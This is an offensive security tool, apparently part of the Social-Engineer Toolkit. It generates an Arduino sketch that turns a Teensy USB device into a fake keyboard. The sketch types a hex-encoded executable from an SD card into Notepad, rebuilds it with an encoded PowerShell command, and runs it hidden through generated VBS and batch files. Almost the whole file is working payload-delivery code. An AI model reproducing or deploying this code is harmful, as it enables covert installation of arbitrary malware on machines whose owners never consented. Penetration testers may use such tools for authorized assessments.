#!/usr/bin/python
import base64
import binascii
import os
import subprocess

import src.core.setcore as core

##########################################################################
#
#                            BSIDES LV SDCARD to Teensy Creator
#
#                                by Josh Kelley (@winfang98)
#                                Dave Kennedy (@hackingdave)
#
##########################################################################

##########################################################################
##########################################################################

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

# print main stuff for the application
print("""
********************************************************************
        BSIDES Las Vegas ----  SDCard to Teensy Creator
********************************************************************

Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @hackingdave)

This tool will read in a file from the Teensy SDCard, not mount it via
Windows and perform a hex to binary conversion via Powershell. It requires
you to have a Teensy device with a soldered USB device on it and place the
file that this tool outputs in order to successfully complete the task.

It works by reading natively off the SDCard into a buffer space thats then
written out through the keyboard.
""")

# if we hit here we are good since msfvenom is installed
print("""
        .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
        |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
        `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
                                                   enabled.\n""")

# grab the path and filename from user
path = input(core.setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
if not os.path.isfile(path):
    while True:
        core.print_warning("Filename not found, try again")
        path = input(core.setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
        if os.path.isfile(path):
            break

core.print_warning("Note: This will only deliver the payload, you are in charge of creating the listener if applicable.")
core.print_status("Converting the executable to a hexadecimal form to be converted later...")

with open(path, "rb") as fileopen:
    data = fileopen.read()
data = binascii.hexlify(data)
with open("converts.txt", "w") as filewrite:
    filewrite.write(data)
print("[*] File converted successfully. It has been exported in the working directory under 'converts.txt'. "
      "Copy this one file to the teensy SDCard.")

output_variable = "/*\nTeensy Hex to File SDCard Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)\n" \
                  "Reading from a SD card.  Based on code from: http://arduino.cc/en/Tutorial/DumpFile\n*/\n\n"

# this is used to write out the file
random_filename = core.generate_random_string(8, 15) + ".txt"

# powershell command here, needs to be unicoded then base64 in order to
# use encodedcommand
powershell_command = ("$s=gc \"$HOME\\AppData\\Local\\Temp\\{random_filename}\";"
                      "$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');"
                      "$b=new-object byte[] $($s.Length/2);"
                      "0..$($b.Length-1)|%{{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)}};"
                      "[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\{random_filename}.exe\",$b)".format(random_filename=random_filename))

##########################################################################
#
# there is an odd bug with python unicode, traditional unicode inserts a
# null byte after each character typically.. python does not so the encoded
# command becomes corrupt in order to get around this a null byte is pushed
# to each string value to fix this and make the encodedcommand work properly
#
##########################################################################

# blank command will store our fixed unicode variable
blank_command = ""
# loop through each character and insert null byte
for char in powershell_command:
    # insert the nullbyte
    blank_command += char + "\x00"

# assign powershell command as the new one
powershell_command = blank_command
# base64 encode the powershell command
powershell_command = base64.b64encode(powershell_command)

# vbs filename
vbs = core.generate_random_string(10, 15) + ".vbs"
# .batch filename
bat = core.generate_random_string(10, 15) + ".bat"

# write the rest of the teensy code
output_variable += (r"""

#include <avr/pgmspace.h>
#include <SD.h>

// Teensy ++ LED is 6.  Teensy the LED is 11.
int ledPin = 6;

void setup()
{{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd /c echo 0 > %TEMP%\\\\{random_filename}");
  delay(750);
  CommandAtRunBar("notepad %TEMP%\\\\{random_filename}");
  delay(1000);
  // Delete the 0
  PRES(KEY_DELETE);
  // This is the SS pin on the Teensy.  Pin 20 on the Teensy ++.  Pin 0 on the Teensy.
  const int chipSelect = 20;

  // make sure that the default chip select pin is set to
  // output, even if you don't use it:
  pinMode(10, OUTPUT);

  // see if the card is present and can be initialized:
  if (!SD.begin(chipSelect)) {{
    Keyboard.println("Card failed, or not present");
    // don't do anything more:
    return;
  }}

  // open the file. note that only one file can be open at a time,
  // so you have to close this one before opening another.
  // Larger the file, more likely it wouldn't fit in a normal int var.
  // This is the workaround for it.
  long int filePos;
  long int fileSize;
  File dataFile = SD.open("converts.txt");
  if (dataFile) {{
    fileSize = dataFile.size();
    for (filePos = 0; filePos <= fileSize; filePos++) {{
      Keyboard.print(dataFile.read(),BYTE);
      delay(10);
    }}
    dataFile.close();
  }}
  else {{
    Keyboard.println("error opening converts.txt");
  }}
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  delay(5000);
  CtrlS();
  delay(2000);
  AltF4();
  delay(5000);
  // Cannot pass entire encoded command because of the start run length
  // run through cmd
  CommandAtRunBar("cmd");
  delay(1000);
  Keyboard.println("{encodedcommand}");
  // Tweak this delay.  Larger files take longer to decode through powershell.
  delay(10000);
  Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %TEMP%\\\\{vbs}");
  Keyboard.println("echo WshShell.Run chr(34) ^& \\"%TEMP%\\\\{bat}\\" ^& Chr(34), 0 >> %TEMP%\\\\{vbs}");
  Keyboard.println("echo Set WshShell = Nothing >> %TEMP%\\\\{vbs}");
  Keyboard.println("echo %TEMP%\\\\{random_filename}.exe > %TEMP%\\\\{bat}");
  Keyboard.println("wscript %TEMP%\\\\{vbs}");
  delay(1000);
  Keyboard.println("exit");
}}
void loop () {{}}
void BlinkFast(int BlinkRate){{
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){{
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }}
}}
void AltF4(){{
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}}
void CtrlS(){{
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){{
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}}
void PRES(int KeyCode){{
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}}
""".format(random_filename=random_filename, encodedcommand=core.powershell_encodedcommand(powershell_command), vbs=vbs, bat=bat))
# delete temporary file
subprocess.Popen("rm {0} 1> /dev/null 2>/dev/null".format(random_filename), shell=True).wait()
print("[*] Binary to Teensy file exported as teensy.ino")
# write the teensy.ino file out
with open("teensy.ino", "w") as filewrite:
    # write the teensy.ino file out
    filewrite.write(output_variable)
print("""

Instructions:

Copy the converts.txt file to the sdcard on the Teensy device. Use the teensy.ino normally
and use the Arduino IDE to place the latest code in there. Notice that you need to change
some code marked above based on the Teensy and the Teensy++ based on how you soldered the PIN's
on.

Happy hacking.
""")
core.return_continue()
